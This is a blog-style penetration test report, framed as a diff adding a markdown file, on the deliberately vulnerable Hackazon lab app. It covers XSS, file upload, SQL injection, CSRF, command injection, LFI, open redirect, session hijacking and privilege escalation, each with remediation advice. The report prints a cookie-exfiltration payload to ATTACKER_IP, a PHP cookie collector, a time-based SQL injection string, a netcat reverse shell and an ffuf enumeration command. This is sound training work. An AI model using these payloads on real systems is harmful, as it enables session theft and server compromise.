@@ -1,0 +1,708 @@
+# Hackazon — Web Application Security Assessment
+
+Hello everyone, for some context Hackazon is a web app that is designed to be vulnerable to try and test multiple attack paths on it. I didn’t find that many walkthroughs or guides for it online, so I figured why not do it and make it look like a professional report, to help me get better at report writing as well as web application pentesting. With that being said, hope this will be helpful.
+
+![](https://miro.medium.com/v2/resize:fit:700/1*E00QVvMui980Z-vsLtG6oA.png)
+
+**Date:** December 2025
+
+**Author:** Elmehdi Laassiri
+
+**Scope:** Black-box penetration test of the Hackazon web application
+
+# **1. Executive Summary**
+
+This report presents the results of a security assessment conducted against the Hackazon web application. The objective of the assessment was to identify and exploit common web application vulnerabilities and evaluate their potential impact on application and system security.
+
+Multiple critical vulnerabilities were identified, including Cross-Site Scripting (XSS), SQL Injection, insecure file upload, command injection, Cross-Site Request Forgery (CSRF), Local File Inclusion (LFI), and open redirect. Several of these vulnerabilities were successfully chained together, ultimately leading to remote code execution and full compromise of the underlying server with root privileges.
+
+The results demonstrate a complete breakdown of application-layer and system-level security controls, highlighting the need for immediate remediation.
+
+# **2. Scope and Methodology**
+
+# **2.1 Scope**
+
+The scope of this penetration test included:
+
+- The entire Hackazon web application
+- All publicly accessible endpoints, directories, and functionalities
+- Authenticated and unauthenticated application features
+- The underlying server hosting the Hackazon application
+
+The assessment was conducted using a **black box testing approach**, meaning no source code or privileged access was provided. All findings were identified through external interaction with the application.
+
+Exploitation activities were performed only to the extent necessary to demonstrate the security impact of each vulnerability.
+
+# **2.2 Methodology**
+
+### **2.2.1 Testing Approach**
+
+The security assessment was conducted using a **black-box testing approach**, simulating the perspective of an external attacker with no prior knowledge of the application’s internal architecture or source code. No credentials or privileged access were provided at the beginning of the assessment.
+
+The objective was to identify exploitable vulnerabilities within the Hackazon web application and assess their impact on both application-level and system-level security.
+
+### **2.2.2 Testing Methodology**
+
+The assessment combined **manual testing techniques** with **supporting automated tools** in order to ensure accurate vulnerability identification and reliable exploitation.
+
+Manual testing was primarily performed using **Burp Suite**, which was used to intercept, analyze, and modify HTTP requests and responses. Browser developer tools were also used to analyze client-side behavior and application logic.
+
+Several automated tools were used to assist during reconnaissance and exploitation phases:
+
+- **Nmap** was used to identify exposed services on the target host.
+- **Dirb** was used for directory and endpoint enumeration.
+- **SQLMap** and **Ghauri** were used to assist in identifying and exploiting SQL injection vulnerabilities, particularly for extracting data from blind time-based SQL injection flaws.
+
+Automated tools were used strictly as **supporting aids**. All identified vulnerabilities were **manually validated** to confirm exploitability and accurately assess their impact. In cases where automated tools proved unreliable, such as blind time-based SQL injection, manual validation was prioritized.
+
+Exploitation was performed **only to the extent necessary to demonstrate impact**, in accordance with the course requirements. No denial-of-service attacks or destructive actions were conducted.
+
+### **2.2.3 Reconnaissance and Endpoint Discovery**
+
+Initial reconnaissance was performed to identify exposed services and application endpoints. Network-level discovery revealed the web application as the primary attack surface.
+
+Directory and endpoint enumeration allowed the identification of multiple application routes, including file upload functionality, help article handlers, and administrative features. These endpoints were subsequently tested manually and led to the discovery of several critical vulnerabilities documented in this report.
+
+# **3. Vulnerability Overview**
+
+# **3.1 Vulnerability Summary Table**
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:623/1*Fliv6UY5FP1voiL7L1wsXg.png)
+
+# **3.2 Additional Observations**
+
+During the assessment, several additional security issues were identified that are not standalone vulnerabilities but significantly **amplify the impact** of the primary findings or enable further exploitation when combined with them.
+
+**Session Hijacking**
+
+The application is susceptible to session hijacking as a consequence of exploitable client-side vulnerabilities, particularly Cross-Site Scripting (XSS). Successful exploitation allows an attacker to obtain or reuse valid session identifiers, enabling full impersonation of authenticated users without requiring their credentials.
+
+Session hijacking was demonstrated by reusing a valid session identifier in a separate browser context, resulting in unauthorized access to another user’s account. This issue is considered an **impact** of existing vulnerabilities rather than a standalone root cause.
+
+**CSRF Token Exposure via XSS**
+
+Although CSRF tokens are present in the application’s client-side templates, the existence of XSS allows an attacker to programmatically extract these tokens from the page. As a result, CSRF protections can be effectively bypassed, enabling forged state-changing requests to be executed on behalf of authenticated users.
+
+This observation demonstrates that the CSRF protection mechanism is insufficient when combined with client-side injection vulnerabilities and significantly increases the overall risk.
+
+**Kernel-Level Privilege Escalation**
+
+Following successful exploitation of application-level vulnerabilities and the acquisition of a low-privileged shell on the server, further analysis revealed that the host system was running an outdated Linux kernel vulnerable to known privilege escalation attacks.
+
+By exploiting this weakness, it was possible to escalate privileges from a non-privileged user to root, resulting in full compromise of the underlying host. This confirms that vulnerabilities in the Hackazon web application alone are sufficient to ultimately compromise the entire system hosting the application.
+
+# **4. Vulnerability Details**
+
+# **4.1 V-01 — Stored & Reflected Cross-Site Scripting (XSS)**
+
+# **Description**
+
+Cross-Site Scripting (XSS) is a client-side vulnerability that occurs when user-controlled input is reflected or stored by the application without proper output encoding, allowing the execution of arbitrary JavaScript code in the victim’s browser.
+
+# **Affected Endpoint**
+
+`/faq`
+
+# **Proof of Concept**
+
+While interacting with the FAQ feature, the testers observed that user-submitted questions were rendered back to users without sufficient sanitization.
+
+To verify this behavior, a simple JavaScript payload was submitted through the FAQ form. Upon submission, the injected script was executed by the browser, indicating the presence of an XSS vulnerability.
+
+![](https://miro.medium.com/v2/resize:fit:666/1*mSgEps698OMnCj_8-KpCRA.png)
+
+To determine whether the vulnerability was reflected or stored, the page was refreshed after submission. The payload continued to execute upon page reload, confirming the vulnerability as **Stored XSS**.
+
+![](https://miro.medium.com/v2/resize:fit:594/1*3dMNjefNSEvmg4XFxkDSyQ.png)
+
+At this stage, the testers confirmed that arbitrary JavaScript execution was possible in the context of other users’ sessions.
+
+**Session Cookie Extraction**
+
+To demonstrate the impact of the vulnerability, the testers hosted a malicious JavaScript file on an attacker-controlled server. The script was designed to exfiltrate session cookies by issuing an HTTP request back to the attacker.
+
+```
+new Image().src='http://ATTACKER_IP/index.php?c='+document.cookie;
+```
+
+The payload was injected into the vulnerable FAQ field as follows:
+
+```
+<script src=http://192.168.32.134/script.js></script>
+```
+
+On the attacker side, a PHP listener was hosted to collect incoming cookies:
+
+```
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $value) {
+        file_put_contents("cookies.txt", urldecode($value)."\n", FILE_APPEND);
+    }
+}
+?>
+```
+
+![](https://miro.medium.com/v2/resize:fit:594/1*3dMNjefNSEvmg4XFxkDSyQ.png)
+
+Once users visited the affected FAQ page, the injected script executed automatically and transmitted their session cookies to the attacker-controlled server.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*UjNH-CicVdBdOfmST7SjtA.png)
+
+**Multi-User Impact Verification**
+
+To confirm that the vulnerability affected multiple users, a second user account was created. When the second user visited the FAQ page, the payload executed again, and a new session cookie was received by the attacker.
+
+![](https://miro.medium.com/v2/resize:fit:602/1*eUvGbG7GgNFVx17h_gwWVQ.png)
+
+Now upon visiting the FAQ page, we received a new session cookie.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*McVznjy77EoKBHyPzqwaNg.png)
+
+This confirmed that:
+
+- The payload was stored server-side
+- Any user accessing the page would trigger execution
+- Multiple user sessions could be compromised
+
+# **Severity**
+
+**High (CVSS ~8.2)**
+
+# **Recommendation**
+
+- Apply strict output encoding on all user-supplied content
+- Implement a Content Security Policy (CSP)
+- Sanitize inputs server-side before storage
+- Set session cookies with the HttpOnly and Secure flags
+
+# **4.2 V-02 — Insecure File Upload**
+
+# **Description**
+
+An insecure file upload vulnerability occurs when an application fails to properly validate uploaded files, allowing attackers to upload executable content to the server.
+
+# **Affected Endpoint**
+
+`/upload` (Avatar upload feature)
+
+# **Proof of Concept**
+
+The application allows authenticated users to upload an avatar image. During testing, the testers observed that file extension and content validation were insufficient.
+
+A PHP web shell was uploaded as an avatar file. The application accepted the file without error.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*LlQJZ09l9GriusLc7wWIEg.png)
+
+After saving the profile, the server automatically issued a GET request to load the uploaded avatar. By intercepting this request using Burp Suite, the testers identified the storage location of uploaded files.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*6_Xi2Nzo6mGh-vAN_5pxLA.png)
+
+The uploaded web shell was accessible at:
+
+```
+/user_pictures/54/web.php
+```
+
+Accessing this file resulted in command execution on the server.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*9TbAp6pK3y1Z541uUu8N8g.png)
+
+**Reverse Shell Execution**
+
+To demonstrate impact, a reverse shell payload was executed through the uploaded web shell. A listener was established on the attacker’s machine, and the payload was triggered via the web shell interface.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*XNPajSK2DGga50rhlP6A4Q.png)
+
+A reverse shell connection was successfully obtained.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*iYqLCV-bwT9Joq8IFiKVWA.png)
+
+# **Impact**
+
+- Remote Code Execution
+- Persistent access to the server
+- Full compromise when chained with privilege escalation
+
+# **Severity**
+
+**Critical (CVSS ~9.8)**
+
+# **Recommendation**
+
+- Enforce strict file type validation
+- Rename uploaded files server-side
+- Store uploads outside the web root
+- Disable execution permissions on upload directories
+
+# **4.3 V-03 — SQL Injection (Blind Time-Based)**
+
+# **Description**
+
+SQL Injection occurs when user-controlled input is incorporated into SQL queries without proper parameterization. In this case, the vulnerability is **blind and time-based**, meaning data is inferred through response delays.
+
+# **Affected Endpoint**
+
+`/search?id=`
+
+# **Proof of Concept**
+
+While searching for products, the testers identified the `id` parameter as potentially injectable. Supplying a single quote (`'`) resulted in a server error.
+
+![](https://miro.medium.com/v2/resize:fit:587/1*_AeHYWvbgAuV_Ls3TR9_1Q.png)
+
+While supplying a double quote sequence restored normal behavior.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*8rCEUfrYKSwt80RJ7Mwaeg.png)
+
+To further validate the vulnerability, a time-based payload was injected:
+
+```
+'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+```
+
+The response time increased significantly compared to baseline requests, confirming the presence of a time-based SQL injection.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*10eAkyr5xOCyyeIEzTfNVA.png)
+
+**Tool-Assisted Confirmation**
+
+To confirm exploitability, the testers used **Ghauri**, a tool specialized in blind SQL injection. The tool successfully identified the parameter as injectable.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*8d0kDIqn7Q06L9qHdkr_JA.png)
+
+Due to the nature of time-based SQL injection, exploitation was intentionally limited to proof-of-concept validation, as full extraction would be time-consuming.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*QOulsu_XZlNQJRVzYe-NtQ.png)
+
+# **Impact**
+
+- Database information disclosure
+- Potential extraction of sensitive data
+- Credential compromise
+
+# **Severity**
+
+**Critical (CVSS ~9.1)**
+
+# **Recommendation**
+
+- Use prepared statements
+- Implement parameterized queries
+- Disable verbose database errors
+
+# **4.4 V-04 — Cross-Site Request Forgery (CSRF)**
+
+# **Description**
+
+Cross-Site Request Forgery (CSRF) is a vulnerability that allows an attacker to perform unauthorized actions on behalf of an authenticated user by forcing their browser to submit crafted requests to the application.
+
+Although CSRF tokens are present in the application, testing revealed that they are not properly validated server-side, rendering the protection ineffective.
+
+# **Affected Endpoint**
+
+`POST /wishlist/new`
+
+# **Proof of Concept**
+
+While interacting with the wishlist functionality, the testers observed that a CSRF token parameter (`_csrf_wishlist_add`) was included in the request.
+
+Inspection of the page source revealed that the CSRF token is embedded inside a client-side JavaScript template (`text/x-template`) and is statically exposed to users.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*xICBVna4F4C80RnVJrAtzw.png)
+
+To verify server-side enforcement, the request was intercepted using Burp Suite and the CSRF token parameter was **entirely removed** before forwarding the request.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*Xkq5YTl7Dbr_oCVAQNLOcQ.png)
+
+Despite the absence of a CSRF token, the server processed the request successfully and created a new wishlist.
+
+This confirms that CSRF protection is not enforced server-side.
+
+# **Impact**
+
+- Unauthorized state-changing actions
+- Forced actions performed on behalf of authenticated users
+- Increased risk when chained with XSS
+
+# **Severity**
+
+**Medium (CVSS ~6.8)**
+
+# **Recommendation**
+
+- Enforce CSRF token validation server-side
+- Generate tokens dynamically per session
+- Bind tokens to user sessions
+- Reject requests missing or containing invalid tokens
+
+# **4.5 V-05 — Command Injection**
+
+# **Description**
+
+Command Injection occurs when user-supplied input is passed to system-level commands without proper sanitization, allowing attackers to execute arbitrary commands on the server.
+
+# **Affected Endpoint**
+
+`/account/documents?page=`
+
+# **Proof of Concept**
+
+While exploring the `/account` functionality, the testers enumerated subdirectories and identified a document viewing feature that accepts a `page` parameter.
+
+Various injection techniques were tested against this parameter. Command injection payloads resulted in command execution on the server.
+
+A simple payload was injected to verify command execution, and the output was reflected in the response.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*g8PgrXn3wbOL9_prMrYFuA.png)
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*LqS7sDNOGwLLyu3C7PM5ZA.png)
+
+**Reverse Shell Execution**
+
+To demonstrate impact, a reverse shell payload was crafted using netcat. A listener was set up on the attacker’s machine, and the payload was URL-encoded and injected into the vulnerable parameter.
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.32.134 9001 >/tmp/f
+```
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*uXedVzK74WBBaQjk-k6ZKw.png)
+
+A reverse shell connection was successfully established, granting interactive access to the server as a low-privileged user.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*_PGgZzdLLcx7QOScbcpuAQ.png)
+
+Further tests for privilege escalation were made which resulted in Root access (Detailed in the last section).
+
+# **Impact**
+
+- Remote Command Execution
+- Full server compromise
+- Pivot point for privilege escalation
+
+# **Severity**
+
+**Critical (CVSS ~9.8)**
+
+# **Recommendation**
+
+- Avoid passing user input to system commands
+- Use allowlists for input validation
+- Employ secure APIs instead of shell execution
+- Implement server-side input sanitization
+
+# **4.6 V-06 — Open Redirect**
+
+# **Description**
+
+An Open Redirect vulnerability occurs when an application allows user-controlled input to dictate redirection targets without validation, enabling phishing and malicious redirections.
+
+# **Affected Endpoint**
+
+`/user/login?return_url=`
+
+# **Proof of Concept**
+
+During authentication testing, the testers observed a `return_url` parameter used to redirect users after login.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*dY1LOph07uP2Md8bPiO6IQ.png)
+
+By intercepting the login request and modifying the `return_url` parameter to an external domain, the server issued a redirection request to the attacker-controlled URL.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*xLeayx-0TFO8L4qnN7T6ZA.png)
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*jW68_IzCbKYoAGRG7i_KAA.png)
+
+This confirmed the presence of an Open Redirect vulnerability.
+
+For proof-of-concept validation, the application was redirected to `http://perdu.com`, satisfying the assignment requirements.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*KhWwQgqSVFSMHIIhLi0gdg.png)
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*D1XVgiX-zTNRk6ECWkHprQ.png)
+
+# **Impact**
+
+- Phishing attacks
+- Credential theft
+- Abuse in social engineering campaigns
+
+# **Severity**
+
+**Medium (CVSS ~6.1)**
+
+# **Recommendation**
+
+- Restrict redirects to internal paths only
+- Implement allowlists for redirection targets
+- Reject absolute URLs in redirection parameters
+
+# **4.7 V-07 — Local File Inclusion (LFI)**
+
+# **Description**
+
+Local File Inclusion (LFI) occurs when an application allows attackers to include arbitrary files from the server’s filesystem through user-controlled parameters.
+
+# **Affected Endpoint**
+
+`/account/help_articles?page=`
+
+# **Proof of Concept**
+
+While accessing help articles, the testers identified the `page` parameter as injectable. Path traversal sequences were tested against this parameter.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*sPvVLPE5C33sUxPK91t9Tw.png)
+
+Using automated fuzzing, multiple file inclusion payloads returned valid responses.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*IdyJJN2GYlEgCSvY_w3ivQ.png)
+
+![](https://miro.medium.com/v2/resize:fit:537/1*58prkwAH-CtwuJ_OVEz2bg.png)
+
+Rather than targeting non-sensitive system files, the testers successfully accessed serialized PHP objects containing internal application data, including session-bound information and application logic.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*sBJXJ7gY3pIhMgEqzVj3iw.png)
+
+![](https://miro.medium.com/v2/resize:fit:622/1*qPZHv__uJjRZw0o_ByS2eQ.png)
+
+This data is significantly more sensitive than standard system files.
+
+# **Impact**
+
+- Disclosure of internal application structure
+- Exposure of session-related data
+- Increased attack surface for deserialization attacks
+
+# **Severity**
+
+**High (CVSS ~8.0)**
+
+# **Recommendation**
+
+- Enforce strict allowlists for included files
+- Remove direct file inclusion logic
+- Normalize and validate file paths server-side
+
+# **4.8 V-08 — Session Hijacking**
+
+# **Description**
+
+Session hijacking occurs when attackers gain unauthorized access to user sessions by reusing stolen or improperly invalidated session identifiers.
+
+# **Affected Mechanism**
+
+PHPSESSID cookie handling
+
+# **Proof of Concept**
+
+Using the previously identified XSS vulnerability, session cookies were successfully extracted from victim browsers (specifically for user test2).
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*wFifooPjnRJbfZSVVFX8Dw.png)
+
+Further testing revealed that session identifiers were **not invalidated upon logout**. Reusing a captured session cookie allowed attackers to impersonate other users. For this POC, we will go from a non-authenticated user Wishlist to the Wishlist of user test2.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*I05t3K6YsYHF9lpIKS26wg.png)
+
+By injecting the stolen cookie of another user via browser developer tools or via Burp, the testers were able to access protected resources as another user.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*uv0TevR6eUnj6Ri_mboA_g.png)
+
+After reloading the page:
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*iywJU-oejMaE9VCfOMciLA.png)
+
+We were able to confirm the session hijacking vulnerability.
+
+# **Impact**
+
+- Full account takeover
+- Unauthorized access to private data
+- Persistent session abuse
+
+# **Severity**
+
+**High (CVSS ~8.4)**
+
+# **Recommendation**
+
+- Invalidate sessions on logout
+- Regenerate session identifiers after authentication
+- Bind sessions to IP or User-Agent where possible
+
+# **4.9 V-09 — Username Enumeration & Brute-Force Authentication**
+
+# **Description**
+
+Username enumeration occurs when authentication responses differ depending on whether a username exists. Combined with the absence of rate limiting, this enables brute-force attacks.
+
+# **Affected Endpoints**
+
+`/user/register` `/user/login`
+
+# **Proof of Concept**
+
+When attempting to register an existing username, the application returned a distinct error message indicating that the username already exists.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*6nRV7AYSn7Gtwz6PFLkzjw.png)
+
+This behavior allowed the testers to enumerate valid usernames using automated tools by filtering responses, using Burp to get an idea of how the request and response should look like:
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*fYQFnij4HbRZf322ACpv5A.png)
+
+We were able to craft our ffuf request to brute force valid usernames.
+
+```
+ffuf -u http://192.168.32.143/user/register \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "first_name=test&last_name=test&username=FUZZ&email=FUZZ@gmail.com&password=aaaa&password_confirmation=aaaa" \
+  -w users.txt \
+  -mr "User already registered"
+```
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*zX3jmImY92IPGOpRK-FkRg.png)
+
+Once valid usernames were identified, password brute-force attacks were conducted due to the absence of rate limiting or account lockout mechanisms.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*muPDyGXu9Gj5qUdAb-_6nw.png)
+
+Valid credentials were successfully identified during testing.
+
+# **Impact**
+
+- Credential compromise
+- Unauthorized account access
+- Increased effectiveness of brute-force attacks
+
+# **Severity**
+
+**Medium (CVSS ~6.8)**
+
+# **Recommendation**
+
+- Use generic authentication error messages
+- Implement rate limiting
+- Enforce account lockout policies
+
+# **4.10 V-10 — Kernel-Level Privilege Escalation**
+
+# **Description**
+
+Privilege escalation occurs when a system allows a low-privileged user to gain elevated privileges. In this case, the host system was running an outdated Linux kernel vulnerable to known exploits.
+
+# **Affected Component**
+
+Linux Kernel (outdated version)
+
+# **Proof of Concept**
+
+Following successful command execution on the server, the testers conducted local enumeration via linpeas as well as multiple manual methods and finally identified kernel vulnerabilities.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*ouZ5BpExcOihGY4hlbS40g.png)
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*KMFIHCIrQrUp4uQzyMhncw.png)
+
+A publicly available kernel exploit was compiled statically due to not having gcc on the target machine, and transferred to the target system. Executing the exploit resulted in root-level access.
+
+Press enter or click to view image in full size
+
+![](https://miro.medium.com/v2/resize:fit:700/1*YCa9YPIanTHSIl-baNdiIw.png)
+
+After that the testers were able to fully compromise the machine.
+
+# **Impact**
+
+- Full system compromise
+- Persistent root access
+- Total loss of confidentiality, integrity, and availability
+
+# **Severity**
+
+**Critical (CVSS ~10.0)**
+
+# **Recommendation**
+
+- Update the operating system and kernel
+- Apply security patches regularly
+- Restrict application-level access to the host
+
+# **7. Conclusion**
+
+The Hackazon application contains multiple critical security vulnerabilities that can be exploited individually or chained together to achieve full system compromise. The successful exploitation of these vulnerabilities demonstrates severe weaknesses in input validation, authentication handling, file management, and system hardening.
+
+An attacker could leverage these issues to compromise user accounts, extract sensitive data, execute arbitrary commands, and gain persistent root access to the server.
+
+Immediate remediation is strongly recommended, with priority given to vulnerabilities enabling remote code execution, SQL Injection, and Cross-Site Scripting. Implementing secure coding practices, proper access controls, and system hardening measures is essential to improve the overall security posture of the application.
